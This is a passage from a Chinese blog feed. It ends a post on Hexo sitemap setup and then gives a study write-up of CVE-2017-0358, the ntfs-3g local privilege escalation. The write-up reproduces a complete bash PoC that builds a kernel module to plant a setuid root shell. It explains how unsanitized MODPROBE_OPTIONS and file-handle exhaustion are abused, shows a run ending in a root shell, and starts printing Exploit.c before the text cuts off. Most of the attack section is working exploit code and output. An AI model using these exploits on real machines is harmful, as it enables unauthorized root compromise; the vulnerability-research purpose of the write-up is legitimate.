class="attr">baidusitemap:</span><span class="attr">    path:</span> <span class="string">baidusitemap.xml</span></code></pre><p>编译<code>hexo g</code>，在 public 目录下可以看到sitemap.xml和baidusitemap.xml文件，重新发布至服务器<code>hexo d</code>。</p><h2 id="0x04-未完待续"><a href="#0x04-未完待续" class="headerlink" title="0x04 未完待续"></a>0x04 未完待续</h2><ol><li>待站点被收录后，上传sitemap.xml；</li><li>显示分类文章总数(目测有难度)</li><li>开启评论</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-0358</title>
      <link href="/2018/10/21/CVE-2017-0358/"/>
      <url>/2018/10/21/CVE-2017-0358/</url>
      
        <content type="html"><![CDATA[<p>CVE-2017-0358，Linux本地提权漏洞。<br><a id="more"></a></p><h2 id="0x00-ntfs-3g-Debian-9-Privilege-Escalation"><a href="#0x00-ntfs-3g-Debian-9-Privilege-Escalation" class="headerlink" title="0x00 ntfs-3g (Debian 9) - Privilege Escalation"></a>0x00 ntfs-3g (Debian 9) - Privilege Escalation</h2><hr><p>　　最近研究了下CVE-2017-0358，Linux下的本地提权漏洞，记录下学习历程。最初是在exploit-db上发现该漏洞<a href="https://www.exploit-db.com/exploits/41240/" target="_blank" rel="noopener">ntfs-3g (Debian 9) - Privilege Escalation</a>，并附有EXP，在简单学习了FUSE、NTFS-3G等基础概念后尝试利用作者给出的EXP复现漏洞。<br>EXP如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  ntfs-3g local privilege escalation to root     @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Credits to Google Project Zero                 @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Tested: Debian 9 (Stretch)                     @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Date: 2017-02-03                               @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@  Link: https://goo.gl/A9I8Vq                    @"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Gathering environment info ..."</span></span><br><span class="line">cwd=<span class="string">"<span class="variable">$(pwd)</span>"</span></span><br><span class="line">un=<span class="string">"<span class="variable">$(uname -r)</span>"</span></span><br><span class="line">dlm=<span class="string">"<span class="variable">$(pwd)</span>/lib/modules"</span></span><br><span class="line">dkf=<span class="string">"<span class="variable">$(pwd)</span>/kernel/fs"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Creating kernel hijack directories ..."</span></span><br><span class="line">mkdir -p <span class="string">"<span class="variable">$&#123;dlm&#125;</span>"</span></span><br><span class="line">mkdir -p <span class="string">"<span class="variable">$&#123;dkf&#125;</span>"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Forging symlinks ..."</span></span><br><span class="line">ln -sf <span class="string">"<span class="variable">$&#123;cwd&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dlm&#125;</span>/<span class="variable">$&#123;un&#125;</span>"</span></span><br><span class="line">ln -sf <span class="string">"<span class="variable">$&#123;cwd&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;dkf&#125;</span>/fuse"</span></span><br><span class="line">ln -sf cve_2017_0358.ko fuse.ko</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Pulling in deps ... "</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[*] Building kernel module ... "</span></span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">'EOF'</span> &gt; cve_2017_0358.c</span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"CC"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"kristian erik hermansen &lt;kristian.hermansen+CVE-2017-0358@gmail.com&gt;"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"PoC for CVE-2017-0358 from Google Project Zero"</span>);</span><br><span class="line"></span><br><span class="line">int init_module(void) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\n"</span>);</span><br><span class="line">  char *envp[] = &#123; <span class="string">"HOME=/tmp"</span>, NULL &#125;;</span><br><span class="line">  char *argv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t"</span>, NULL &#125;;</span><br><span class="line">  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">  char *argvv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"/sbin/rmmod cve_2017_0358"</span>, NULL &#125;;</span><br><span class="line">  call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void cleanup_module(void) &#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">"[*] CVE-2017-0358 exploit unloading ...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">'EOF'</span> &gt; Makefile</span><br><span class="line">obj-m += cve_2017_0358.o</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">make 1&gt;/dev/null 2&gt;/dev/null || <span class="built_in">echo</span> <span class="string">"[-] FAILED: your need make / build tools"</span></span><br><span class="line">cp <span class="string">"/lib/modules/<span class="variable">$&#123;un&#125;</span>/modules.dep.bin"</span> . || <span class="built_in">echo</span> <span class="string">"[-] FAILED: linux-image location non-default?"</span></span><br><span class="line">MODPROBE_OPTIONS=<span class="string">"-v -d <span class="variable">$&#123;cwd&#125;</span>"</span> ntfs-3g /dev/null /dev/null 1&gt;/dev/null 2&gt;/dev/null</span><br><span class="line">/tmp/r00t -c <span class="string">'whoami'</span> | egrep -q <span class="string">'root'</span> &amp;&amp; <span class="built_in">echo</span> <span class="string">"[+] SUCCESS: You have root. Don't be evil :)"</span></span><br><span class="line">/tmp/r00t</span><br></pre></td></tr></table></figure><p>　　疑惑的是无论如何测试，始终不成功，最后怀疑是<code>modprobe</code>函数的问题，查看<a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/sec-Setting_Module_Parameters.html" target="_blank" rel="noopener">官方文档</a>，给出如下解释：</p><blockquote><p><strong>The modprobe command silently succeeds with an exit status of 0 if it successfully loads the module, or the module is already loaded into the kernel.Thus, you must ensure that the module is not already loaded before attempting to load it with custom parameters. The modprobe command does not automatically reload the module, or alert you that it is already loaded.</strong></p></blockquote><p> 　　也就是说，无法解决在系统已加载FUSE模块的前提下重新加载FUSE，并使临时参数生效的问题。黔驴技穷，于是发邮件给作者，作（骗）者（子）赤果果的say：<strong>“need additional modification，you have to make me an offer”</strong>,shit…</p><p>（注：jannh已在<a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>上发布有效版本，<a href="https://www.exploit-db.com/exploits/41356/" target="_blank" rel="noopener">ntfs-3g - Unsanitized modprobe Environment Privilege Escalation</a>）</p><h2 id="0x01-ntfs-3g-modprobe-is-executed-with-unsanitized-environment"><a href="#0x01-ntfs-3g-modprobe-is-executed-with-unsanitized-environment" class="headerlink" title="0x01 ntfs-3g: modprobe is executed with unsanitized environment"></a>0x01 ntfs-3g: modprobe is executed with unsanitized environment</h2><hr><p>　　在经历过艰苦的search之后，终于发现了漏洞的真正作者project zero的jannh<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1072" target="_blank" rel="noopener">(ntfs-3g: modprobe is executed with unsanitized environment)</a>。</p><p>　　漏洞存在于NTFS-3G之中，该程序是由Tuxera公司开发并维护的开源项目，目的是为Linux提供NTFS分区的驱动程序，实现对NTFS文件系统的读写。该程序默认安装在Ubuntu等操作系统中，并且赋予了setuid的权限。作者解释到CVE-2017-0358的根源在于，NTFS-3G在调用<code>modprobe</code>时没有初始化环境变量，致使存在本地提权的风险。漏洞存在于<code>load_fuse_module ()</code>函数之中：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> fuse_fstype <span class="title">load_fuse_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="keyword">pid_t</span> pid;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *cmd = <span class="string">"/sbin/modprobe"</span>;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">req</span> = &#123;</span> <span class="number">0</span>, <span class="number">100000000</span> &#125;;   <span class="comment">/* 100 msec */</span></span><br><span class="line">   fuse_fstype fstype;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123;</span><br><span class="line">       pid = fork();</span><br><span class="line">       <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">           execl(cmd, cmd, <span class="string">"fuse"</span>, <span class="literal">NULL</span>);</span><br><span class="line">           _exit(<span class="number">1</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>)</span><br><span class="line">           waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * We sleep first because despite the detection of the loaded</span></span><br><span class="line"><span class="comment">        * FUSE kernel module, fuse_mount() can still fail if it's not</span></span><br><span class="line"><span class="comment">        * fully functional/initialized. Note, of course this is still</span></span><br><span class="line"><span class="comment">        * unreliable but usually helps.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       nanosleep(&amp;req, <span class="literal">NULL</span>);</span><br><span class="line">       fstype = get_fuse_fstype();</span><br><span class="line">       <span class="keyword">if</span> (fstype != FSTYPE_NONE)</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> fstype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 　　当NTFS-3G被调用时，利用<code>get_fuse_fstype()</code>检测当前系统是否加载FUSE模块，若未加载，则利用<code>load_fuse_module()</code>中的<code>modprobe</code>，加载FUSE模块。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> fuse_fstype <span class="title">get_fuse_fstype</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    fuse_fstype fstype = FSTYPE_NONE;</span><br><span class="line"></span><br><span class="line">    FILE *f = fopen(<span class="string">"/proc/filesystems"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        ntfs_log_perror(<span class="string">"Failed to open /proc/filesystems"</span>);</span><br><span class="line">        <span class="keyword">return</span> FSTYPE_UNKNOWN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), f)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">"fuseblk\n"</span>)) &#123;</span><br><span class="line">            fstype = FSTYPE_FUSEBLK;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">"fuse\n"</span>))</span><br><span class="line">            fstype = FSTYPE_FUSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> fstype;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　问题在于，<code>modprobe</code>的设计初衷并不是运行在一个setuid的环境当中，而NTFS-3G却需要setuid的权限。在<code>modprobe</code>的man文档中明确指出：</p><blockquote><p><strong>The MODPROBE_OPTIONS environment variable can also be used to pass arguments to modprobe.</strong></p></blockquote><p>　　因此，在一个尚未加载FUSE 的系统中，攻击者可以通过设置环境变量<strong>MODPROBE_OPTIONS “-C /tmp/evil_config -d /tmp/evil_root”</strong>，强制<code>modprobe</code>加载恶意配置文件，导致攻击者具备加载任意代码到系统内核的能力。</p><p>　　在现实情况中，FUSE在大部分系统中已被作为内核的一部分，基本都处于已加载的状态，也就是文章伊始提到的问题。 jannh对这个问题给出了一种解决思路，通过耗尽系统范围内所有进程可以打开的文件句柄的数量 (/proc/sys/fs/file-max)，使得NTFS-3G在<code>fopen(&quot;/proc/filesystems&quot;, &quot;r&quot;)</code>时异常，导致<code>get_fuse_fstype()</code>返回<strong>FSTYPE_UNKNOWN</strong>，在主函数中触发<code>load_fuse_module()</code>函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fstype = get_fuse_fstype();</span><br><span class="line"></span><br><span class="line">err = NTFS_VOLUME_NO_PRIVILEGE;</span><br><span class="line"><span class="keyword">if</span> (restore_privs())</span><br><span class="line">    <span class="keyword">goto</span> err_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstype == FSTYPE_NONE || fstype == FSTYPE_UNKNOWN)</span><br><span class="line">    fstype = load_fuse_module();</span><br><span class="line">create_dev_fuse();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drop_privs())</span><br><span class="line">    <span class="keyword">goto</span> err_out;</span><br></pre></td></tr></table></figure><h2 id="0x02-Attack"><a href="#0x02-Attack" class="headerlink" title="0x02 Attack"></a>0x02 Attack</h2><p>　　jannh给出了<a href="https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/41356.zip" target="_blank" rel="noopener">EXP</a>，通过测试成功在Ubuntu Server 16.10、kali 4.3中实现提权，在Debian 8中测试失败。测试如下：（注：在VM中测试时，需要多CPU的支持）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">user@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.tar</span><br><span class="line"></span><br><span class="line">user@ubuntu:~$ <span class="built_in">cd</span> ntfs-3g-modprobe-unsafe/</span><br><span class="line"></span><br><span class="line">user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.sh</span><br><span class="line"></span><br><span class="line">make: Entering directory <span class="string">'/usr/src/linux-headers-4.8.0-32-generic'</span></span><br><span class="line"></span><br><span class="line">  CC [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.o</span><br><span class="line"></span><br><span class="line">  Building modules, stage 2.</span><br><span class="line"></span><br><span class="line">  MODPOST 1 modules</span><br><span class="line"></span><br><span class="line">  CC      /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o</span><br><span class="line"></span><br><span class="line">  LD [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.ko</span><br><span class="line"></span><br><span class="line">make: Leaving directory <span class="string">'/usr/src/linux-headers-4.8.0-32-generic'</span></span><br><span class="line"></span><br><span class="line">depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directory</span><br><span class="line"></span><br><span class="line">depmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directory</span><br><span class="line"></span><br><span class="line">user@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploit</span><br><span class="line"></span><br><span class="line">looks like we won the race</span><br><span class="line"></span><br><span class="line">got ENFILE at 198088 total</span><br><span class="line"></span><br><span class="line">Failed to open /proc/filesystems: Too many open files <span class="keyword">in</span> system</span><br><span class="line"></span><br><span class="line">  yay, modprobe ran!</span><br><span class="line"></span><br><span class="line">modprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open <span class="built_in">builtin</span> file <span class="string">'/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'</span></span><br><span class="line"></span><br><span class="line">modprobe: ERROR: could not insert <span class="string">'rootmod'</span>: Too many levels of symbolic links</span><br><span class="line"></span><br><span class="line">Error opening <span class="string">'/tmp/ntfs_sploit.u48sGO/volume'</span>: Is a directory</span><br><span class="line"></span><br><span class="line">Failed to mount <span class="string">'/tmp/ntfs_sploit.u48sGO/volume'</span>: Is a directory</span><br><span class="line"></span><br><span class="line">we have root privs now...</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/ntfs-3g-modprobe-unsafe<span class="comment"># id</span></span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lxd),123(libvirt),127(sambashare),128(lpadmin),1000(user)</span><br></pre></td></tr></table></figure><h2 id="0x03-Code-Exploit-c"><a href="#0x03-Code-Exploit-c" class="headerlink" title="0x03 Code: Exploit.c"></a>0x03 Code: Exploit.c</h2><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* prevent shell from backgrounding ntfs-3g when stopped */</span></span><br><span class="line"><span class="keyword">pid_t</span> initial_fork_child = fork();</span><br><span class="line"><span class="keyword">if</span> (initial_fork_child == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"initial fork"</span>);</span><br><span class="line"><span class="keyword">if</span> (initial_fork_child != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span> (waitpid(initial_fork_child, &amp;status, <span class="number">0</span>) != initial_fork_child)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">"waitpid"</span>);</span><br><span class="line">    execl(<span class="string">"rootshell"</span>, <span class="string">"rootshell"</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// Set up workspace with volume, mountpoint, modprobe config and module directory.</span></span><br><span class="line"><span class="keyword">char</span> <span class="keyword">template</span>[] = <span class="string">"/tmp/ntfs_sploit.XXXXXX"</span>;</span><br><span class="line"><span class="keyword">if</span> (mkdtemp(<span class="keyword">template</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mkdtemp"</span>);</span><br><span class="line"><span class="keyword">char</span> volume[<span class="number">100</span>], mountpoint[<span class="number">100</span>], modprobe_confdir[<span class="number">100</span>], modprobe_conffile[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(volume, <span class="string">"%s/volume"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(mountpoint, <span class="string">"%s/mountpoint"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_confdir, <span class="string">"%s/modprobe.d"</span>, <span class="keyword">template</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_conffile, <span class="string">"%s/sploit.conf"</span>, modprobe_confdir);</span><br><span class="line"><span class="keyword">if</span> (mkdir(volume, <span class="number">0777</span>) || mkdir(mountpoint, <span class="number">0777</span>) || mkdir(modprobe_confdir, <span class="number">0777</span>))</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"mkdir"</span>);</span><br><span class="line"><span class="keyword">int</span> conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, <span class="number">0666</span>);</span><br><span class="line"><span class="keyword">if</span> (conffd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"open modprobe config"</span>);</span><br><span class="line"><span class="keyword">int</span> suidfile_fd = open(<span class="string">"rootshell"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (suidfile_fd == <span class="number">-1</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"unable to open ./rootshell"</span>);</span><br><span class="line"><span class="keyword">char</span> modprobe_config[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(modprobe_config, <span class="string">"alias fuse rootmod\noptions rootmod suidfile_fd=%d\n"</span>, suidfile_fd);</span><br><span class="line"><span class="keyword">if</span> (write(conffd, modprobe_config, <span class="built_in">strlen</span>(modprobe_config)) != <span 